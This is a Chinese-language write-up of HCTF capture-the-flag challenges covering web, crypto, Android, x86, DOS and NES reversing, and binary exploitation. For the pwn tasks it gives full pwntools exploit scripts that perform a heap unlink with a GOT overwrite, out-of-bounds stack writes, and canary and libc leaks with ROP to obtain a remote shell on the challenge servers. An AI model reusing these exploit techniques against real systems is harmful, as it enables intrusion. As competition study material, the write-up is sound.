#Ftitd writeup

##1 - 404

curl -i 后在 headers 里面找到 flag

##2 - fuck ===

一开始看错以为 `==` 构造了两个 md5 值都是 0exxxxxxxxx 形式的字符串传进去发现没结果，突然发现是 ===，回想起 ISG2015 的 web 题目，数组键值存在整形溢出，于是构造 http://120.26.93.115:18476/eff52083c4d43ad45cc8d6cd17ba13a1/index.php?a[1111111111111111111111111111111111111111]=111111111111&b[11111111111111111111111111111111111111111111111111]=1111111111111111111111111111

得到 Flag: hctf{dd0g_fjdks4r3wrkq7jl}


##4 - Andy

Android 逆向，反编译后得到源码，就是三层 Encode，唯一的坑点在于 table 映射的那部分并不是一一对应的，把每种情况试一下就过了

##7 - Server is done

我跟你说题目名都那么多拼错我要报警了（还是说这是故意的梗 →_→）。PS: smallbin 那英语我看不懂啊。。。

非常规脑洞题。

随便提交个啥之后发现源码里有 flag，尼玛刷新还会变，而且就算第一个 byte 一样后面也不一样。Hint 说是 Stream Cipher 可是尼玛刷新会变的 Stream Cipher 这是 one-time pad 啊。。那 Perfect Secrecy 了啊做个卵。。所以一定有什么 wrong practice，要么是 reuse key 了要么就是 predictable key。

flag 长度 512 bytes 于是直接提交了 `'\x00' * 512` 拿 key。然后直接这个 key 和返回的 flag 做 xor 就行了。

（我还以为是要先拿前面的 key 然后找 rand 的种子呢。。结果居然是用一样的 key stream 加密 arg 和 flag。。我还在想没这么简单吧 于是就随便试了前几个字符结果发现全可见 果然是我想多了。。所以它相当于是一个 reuse key 的 encryption/decryption oracle →_→）

##11 - 真的非常友善的逆向题（福利）

(1)

```
+40186E  cmp     eax, 0x20
+401871  jnz     00401AC1; 此处改成jmp 401AC1, 可防止按钮逃走
```
(2) 读取输入框内容，并比较长度

```
+4019F2  push    0x1E
+4019F4  lea     eax, [ebp-0x24]
+4019F7  push    eax
+4019F8  push    dword ptr [0x4191F8]
+4019FE  call    [<&USER32.GetWindowTextA>]
+401A04  lea     ecx, [ebp-0x24]
+401A07  lea     edx, [ecx+0x1]
+401A0A  lea     ebx, [ebx]
+401A10  mov     al, [ecx]
+401A12  inc     ecx
+401A13  test    al, al
+401A15  jnz     short 00401A10
+401A17  sub     ecx, edx
+401A19  cmp     ecx, 0x16
+401A1C  jnz     00401AAD
```
(3) 校验

```
+401A22  mov     dl, [ebp-0xF]
+401A25  lea     ecx, [ebp-0x24]
+401A28  call    00401DA0
+401A2D  test    eax, eax
+401A2F  je      short 00401AAD
+401A31  lea     ecx, [ebp-0x24]
+401A34  call    00401BB0
+401A39  test    eax, eax
+401A3B  je      short 00401AAD
```
(4) 校验

```
+401A50  movsx   edx, byte ptr [0x418217]
+401A57  xor     edx, [0x4191B0]
+401A5D  jle     short 00401AA3; 这里不能跳, 且DL必须等于2
+401A5F  movsx   ecx, byte ptr [ebp-0x13]
+401A63  movsx   eax, byte ptr [0x418218]
+401A6A  xor     ecx, edx
+401A6C  cmp     ecx, eax
+401A6E  jnz     short 00401AA3
+401A70  movsx   ecx, byte ptr [ebp-0x12]
+401A74  movsx   eax, byte ptr [0x418219]
+401A7B  xor     ecx, edx
+401A7D  cmp     ecx, eax
+401A7F  jnz     short 00401AA3
+401A81  movsx   ecx, byte ptr [ebp-0x11]
+401A85  movsx   eax, byte ptr [0x41821A]
+401A8C  xor     ecx, edx
+401A8E  cmp     ecx, eax
+401A90  jnz     short 00401AA3
+401A92  movsx   ecx, byte ptr [ebp-0x10]
+401A96  movsx   eax, byte ptr [0x41821B]
+401A9D  xor     ecx, edx
+401A9F  cmp     ecx, eax
+401AA1  je      short 00401AD5
```
(5) 校验

```
+401AD5  mov     ecx, [0x4191C0]
+401ADB  mov     eax, [0x4191D8]
+401AE0  mov     [0x4191D8], ecx
+401AE6  mov     ecx, [0x4191CC]
+401AEC  mov     [0x4191C0], eax
+401AF1  mov     eax, [0x4191E0]
+401AF6  mov     [0x4191E0], ecx
+401AFC  mov     ecx, [0x4191C8]
+401B02  mov     [0x4191CC], eax
+401B07  mov     eax, [0x4191D4]
+401B0C  mov     [0x4191D4], ecx
+401B12  mov     ecx, [0x4191EC]
+401B18  mov     [0x4191C8], eax
+401B1D  mov     eax, [0x4191D0]
+401B22  mov     [0x4191D0], ecx
+401B28  xor     ecx, ecx
+401B2A  mov     [0x4191EC], eax
+401B2F  nop
+401B30  mov     eax, [ecx+0x415600]
+401B36  cmp     eax, [ecx+0x4191C0]
+401B3C  jnz     short 00401B6C
+401B3E  add     ecx, 0x4
+401B41  cmp     ecx, 0x30
+401B44  jl      short 00401B30
+401B46  cmp     edx, 0x2
+401B49  jnz     00401AAD
```

(6) 解密代码
 
第 1 部分:

```c
main()
{
   char d[] = {
      0xEB ,0xFF ,0xFF ,0xFF ,
      0xEE ,0xFF ,0xFF ,0xFF ,
      0xE2 ,0xFF ,0xFF ,0xFF ,
      0xF1 ,0xFF ,0xFF ,0xFF ,
      0xBA ,0xFF ,0xFF ,0xFF ,
      0xB7 ,0xFF ,0xFF ,0xFF
   };
   long *pd = (long *)d;
   char s[6] = "316754";
   char t[7] = {0};
   int i;
   for(i=0; i<6; i++)
   {
      t[i] = s[i] - pd[i];
   }
   puts(t); /* HCTF{} */
   /*==========================*/

}
```

第 2 部分:

```c
void swap(unsigned char *a, unsigned char *b)
{
   unsigned char t;
   t = *a;
   *a = *b;
   *b = t;   
}
main()
{
   unsigned char d[12] =
   {
      0x66,0x64,0xC8,0x68,
      0x75,0x75,0x14,0x0B,
      0x68,0x15,0x68,0x12
   };
   unsigned char p[13] = {0};
   unsigned t;
   int i;
   swap(&d[0], &d[6]);
   swap(&d[3], &d[8]);
   swap(&d[2], &d[5]);
   swap(&d[4], &d[0x0B]);
   for(i=0; i<12; i++)
   {
      if(d[i] >= 0x98)
         p[i] = d[i] - 0x98;
      else if(d[i] >= 0x64)
         p[i] = d[i] - 0x64 + 'a';
      else
         p[i] = d[i] + 'A';
   }
   puts(p); /* UareS0cLeVer */
}
```

答案:
HCTF{UareS0cLeVerJd56}

##13 - What Is This

尼玛居然是小霸王逆向。。这我有严重心理阴影。。

运行了之后发现居然是经典游戏 Jackal。由于对 NES 汇编严重的心理阴影我只能选择静态了。直接去下载原版 Jackal 镜像然后 `cmp -l jackal.nes what-is-this.nes` 找不同。从 0x8 到 0x10 全都覆盖成了 0x00 显然没有卵用，然而从 0x33EE 开始到 0x340C 有相当多的改动并且改动后的数据看起来有意义。于是直接提取了那附近的一段数据。

然后就是去查字符码表，我用的带 Debug 的 VirtualNES 直接加载出来看贴图表。（虽然其实 VirtualNES 因为不明 Bug 根本跑不动游戏）发现 A 是 0x11，于是对那一段数据直接 `''.join([chr(_ - 0x11 + ord('A')) for _ in s])` 就能看到 Flag 了。（注意到 Flag 的后面有三个 0xFF 还是 0x00 来着我忘了，反正会导致 `chr()` 越界，正好省的找边界。。）

##14 - 送分要不要

下载压缩包丢进 0xED 发现后面跟了张 png，单独抠出来之后和解压缩出来的 flag.jpg diff 发现完全一致。后来发现在 zip 和 png 中间有一段字符串，取出来 padding 一下 b64decode 出来一个字符串，再 b32decode 得到 hexstring，最后 hexdecode 就得到 flag

##15 - 一个复古的程序

```
TR 1539.exe
bpint 21 ah=0A
g
```
断在以下地址:

```
3101:0137  BE0200          MOV       SI,0002
3101:013A  BF1B00          MOV       DI,001B
3101:013D  BA0000          MOV       DX,0000
3101:0140  B40A            MOV       AH,0A
3101:0142  CD21            INT       21; <==断点
```

中间几段循环对输入进行处理, 略。  
跟踪到 3101:01E4, 对处理过的输入进行比较, 其中 3101:005D 存放目标数据

```
3101:005D  45 49 41 67 56 4E 6F 4A-66 49 5D 73 5D 45 4E 41  EIAgVNoJfI]s]ENA
3101:006D  48 3D 76 6B 48 62 75 35-40 37 69 42 43 69 43 7D  H=vkHbu5@7iBCiC}

3101:01E4  BF3C00          MOV       DI,003C
3101:01E7  BE5D00          MOV       SI,005D
3101:01EA  B92100          MOV       CX,0021
3101:01ED  8A05            MOV       AL,[DI]
3101:01EF  8A24            MOV       AH,[SI]
3101:01F1  3AC4            CMP       AL,AH
3101:01F3  750E            JNE       0203
3101:01F5  47              INC       DI
3101:01F6  46              INC       SI
3101:01F7  E2F4            LOOP      01ED
```

对目标数据进行解密的代码如下:

```c
main()
{
   unsigned char c[0x20+1] = "EIAgVNoJfI]s]ENAH=vkHbu5@7iBCiC}";
   unsigned char p[0x21] = {0};
   unsigned char b[0x19] = {0};
   unsigned char t;
   int i, j;
   memset(b, 0, sizeof(b));
   memset(p, 0, sizeof(p));
   for(i=0, j=0; i<0x10; i++, j++)
   {
      p[i*2] = c[j];
      p[i*2+1] = c[j+0x10];
   }
   for(i=0; i<0x10; i++)
   {
      t = p[i];
      p[i] = p[i+0x10];
      p[i+0x10] = t;
      p[i] ^= 0x07;
      p[i+0x10] ^= 0x0C;
   }
   for(i=0; i<0x20; i++)
   {
      if(p[i] == 0x2B)
         p[i] = 0x3E;
      else if(p[i] == 0x2F)
         p[i] = 0x3F;
      else if(p[i] >= 0x61)
         p[i] -= (0x61-0x1A);
      else if(p[i] >= 0x41)
         p[i] -= 0x41;
      else
         p[i] -= (0x30-0x34);
   }
   j = 0;
   for(i=0; i<8; i++)
   {
      b[j] |= (p[i*4] << 2) & 0xFC;
      b[j] |= (p[i*4+1] >> 4) & 0x03;
      b[j+1] |= (p[i*4+1] << 4) & 0xF0;
      b[j+1] |= (p[i*4+2] >> 2) & 0x0F;
      b[j+2] |= (p[i*4+2] << 6) & 0xC0;
      b[j+2] |= p[i*4+3] & 0x3F;
      j += 3;
   }
   puts(b); /* hctf{Dd0g 1s 1539 d0gs!} */
}
```

##21 - COMA WHITE

JS 审计 + 视力大比拼。

先恢复上面压缩混淆了的代码段。非常友好只有那么一小段，否则下面那几个混淆一下再恢复还真不一定看得懂。

然后需要目测下面的那些没混淆的是啥。第一个特征很明显是 b64encode，第二个一看那么多玄学数据看着就像 md5。顺带一提建议把常用的这些东西对空字符串运算的结果都记一下 就立即可以看出来。

所以它的加密方法是 把 flag 分割成若干节，每节 1 或 2 bytes。然后每节分别 `hashlib.md5(base64.b64encode(s).replace('=', '')).hexdigest()`，最后拼接起来。因为最多只有 2 bytes 所以直接 brute force 然后拼接就行。

##23 - 教务处

这道题出的挺好，结构简单但是难度不小，首先要找到漏洞，找到漏洞后要能够 leak，完了以后才是写 exp，然而这三个步骤都很不容易。

程序结构很简单，但是漏洞一直找不到。过了很久（放出 hint 之前）去网上搜了 `strncpy()`，发现这个函数不会在 dest 的最后添加 NULL 字符，那么后面的 `strlen()` 就有可能取到溢出的长度。

于是先用 add 操作 malloc 两个堆，把堆填满，再 free 掉，第二次 malloc 又会到这个堆上，由于 strncpy 不会添加 NULL，所以就跟之前堆空间的字符连起来了， `strlen()` 取到的长度就溢出了。

有了堆溢出之后就是触发 `unlink()` 修改 table， leak 的话只要将 free@got 改成某处的 puts，然后将传进去的参数改为 strchr@got，就可以得到 libc 地址了。最后再改掉 free@got 为 system_addr，传进去的空间写入 '/bin/sh\x00'，就能 getshell 了。

```python
from pwn import *
context(terminal='zsh')
elf = ELF('libc.so.64')
offset = elf.symbols['system']-elf.symbols['strchr']

p = remote('120.55.86.95', 11111)
p.recv()
p.writeline('d812bc7f1441e782d2fd6c4bf8b07842')
p.recvuntil('OK')
p.recvuntil('Change a student\'s information.')

p.writeline('a')
p.write(('01A001B\x00\x00\x00\x00\x00\x00\x00\x00\x00'+p64(0x6020e0)).ljust(0x200, '\x00'))
p.writeline('a')
p.write('09AAAAAAAAA100BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'.ljust(0x200, 'C'))
p.writeline('c')
p.writeline('1')
p.writeline('\x00'*4+p64(0x6020e8))
p.recv()
p.recv()

p.writeline('a')
p.write(('19'+19*'A'+'127'+127*'B'+'\n').ljust(0x200,'C'))
p.writeline('a')
p.write(('19'+19*'A'+'127'+127*'B'+'\n').ljust(0x200,'C'))

for _ in range(5):
    p.writeline('a')
    p.write('09/bin/sh\x00A100BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'.ljust(0x200, 'C'))
    p.recv()

p.writeline('d')
p.writeline('5')
p.recv()

p.writeline('c')
p.writeline('3')
p.writeline((0x83-7)*'D'+p64(0x1d0)+'\xa0')
p.writeline('d')
p.writeline('4')
p.recv()

# write strncpy@got
p.writeline('c')
p.writeline('1')
p.writeline(p32(0x90)+p64(0x602018-20)+p32(0x02)+p32(0x90)+p64(0x6020e0-20)+p64(0x0000008300000003)+p64(0x0000000000602048))
p.writeline('c')
p.writeline('1')
p.writeline(p32(0x400F13)+'\x00\x00\x00')
p.recv()

p.writeline('d')
p.writeline('3')
p.recvuntil('So give me student number\n')
strchr_addr = u64(p.recvline().strip()+'\x00\x00')
print hex(strchr_addr)

p.writeline('c')
p.writeline('1')
p.writeline(p64(strchr_addr+offset-0x30))
p.recv()

p.writeline('d')
p.writeline('7')

p.interactive()
```

##25 - Personal blog
Burpsuite 抓包发现 Server 是 GitHub，直接搜索 GitHub 得到https://github.com/LoRexxar/LoRexxar.github.io 然后在 here is f10g.html 发现 flag 是 "aGN0ZntIM3hvX0Ixb2dfSXNfTml1OGlfQjFvZ30="

解码得 flag：hctf{H3xo_B1og_Is_Niu8i_B1og}

##26 - BrainFuck

这题最开始没法做，后来题目改了才行。

用 brainfuck 生成的程序可以越界读写内存。这道题可以读写的是栈，那么就先 leak libc，然后直接修改 rip 跳到 Magic System Addresss 就好。

```python
from pwn import *
context(terminal='zsh')

p = remote('120.55.86.95', 22222)
p.recv()
p.writeline('d812bc7f1441e782d2fd6c4bf8b07842')
p.recvuntil('OK')

p.writeline('+[>,]>>>>>>>>>>>>>>>>>>>>>>>>.>.,<,<,>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>,>,>,>,>,>,>,>,]q')
p.recv()

do_system = 0x4652C
leak = 0x21ec5

p.write('A'*0x1ff+'\x00')
byte1 = p.recv(1)
byte2 = p.recv(1)
print enhex(byte1)
print enhex(byte2)
w_byte1 = ((ord(byte1) & 0xf0)+0x48) & 0xff
w_byte2 = (ord(byte2)+0x0c) & 0xff
p.write(chr(w_byte2))
p.write(chr(w_byte1))
p.write(chr(0xc5))

p.write('\x00')
p.write('\x00')
p.write('\x00')
p.write('\x00')
p.write('\x00')
p.write('\x00')
p.write('\x00')
p.write('\x00')

p.interactive()
```

##27 - What should I do

逆向发现这道题写入最长输入长度后会导致 base64 decode 继续解码下去，从而溢出栈空间，但是这道题有 canary，好在它是用 `fork()` 执行的，所以 canary 不会改变。覆盖栈空间很容易，难点在于 leak canary 和 libc。要做到这一点就是要精确控制解码后的字符串恰好到 canary 前面终止。

接下来调试了很久， libc 很难 leak，需要嵌套好几层，中间用例如 `=` 这样的字符来终止 base64 decode，使其停留在我们想要的位置。

leak 出来后直接布置栈空间就搞定了。

```python
from pwn import *
context(terminal='zsh')

p = remote('120.55.86.95', 44444)
p.recvuntil('TOKEN=')
p.writeline('d812bc7f1441e782d2fd6c4bf8b07842')

p.recv()
p.writeline('Y')
p.recv()

# Round 1
payload = b64e(b64e(b64e('xxxxxxx')+'=='+b64e(b64e(cyclic(0x23))))+'x')
payload = payload.ljust(161, 'Y')
print len(payload)
p.writeline(payload)
p.recvuntil('xxxxxxx')
libc_start = u64('\x00'+p.recv(5)+'\x00\x00')
print hex(libc_start)
libc_system = libc_start+0x24840
libc_sh = libc_start+0x15aedb
popret = 0x400e93
pop3ret = 0x400E8E

# Round 2
p.recv()
payload = b64e(b64e('A'*0x31)+'='+b64e('B'*0x22))
payload = payload.ljust(161, 'Y')
print len(payload)
p.writeline(payload)
p.recvuntil('===')
cookie = u64('\x00'+p.recvline()[-14:-7])
print hex(cookie)

# Round 3
p.recv()
payload = b64e(b64e(b64e('xxxxxx'+p64(popret)+p64(libc_sh)+p64(libc_system)+'x')+'=='+'BB'+p64(cookie)+'C'*8+p64(pop3ret)+'D'*6)+'x')
payload = payload.ljust(161, 'Y')
print len(payload)
p.writeline(payload)

p.interactive()
```